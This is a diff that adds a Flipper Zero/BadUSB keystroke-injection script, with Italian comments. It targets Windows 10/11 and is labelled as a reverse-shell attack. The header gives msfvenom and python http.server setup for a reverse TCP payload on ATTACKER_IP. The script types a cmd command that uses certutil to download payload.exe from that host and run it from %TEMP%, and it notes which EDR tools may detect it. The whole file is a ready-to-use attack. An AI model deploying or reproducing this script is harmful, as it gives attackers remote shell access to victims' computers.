@@ -1,0 +1,22 @@
+REM ============================================================
+REM Title:    LOLBin Download & Execute via Certutil
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Reverse Shell
+REM Privs:    User (no admin)
+REM Layout:   IT
+REM Time:     ~8 secondi
+REM Detect:   Medio - certutil download è monitorato da EDR moderni
+REM Desc:     Usa certutil.exe per scaricare un payload dal C2
+REM           e lo esegue. Certutil è un LOLBin firmato Microsoft.
+REM CHANGE:   ATTACKER_IP, filename, e prepara il payload sul server
+REM SETUP:    Sul server: msfvenom -p windows/x64/shell_reverse_tcp
+REM           LHOST=ATTACKER_IP LPORT=4444 -f exe > payload.exe
+REM           python3 -m http.server 8080
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd /c "cd %TEMP% && certutil -urlcache -split -f http://ATTACKER_IP:8080/payload.exe p.exe && start /b p.exe"
+ENTER
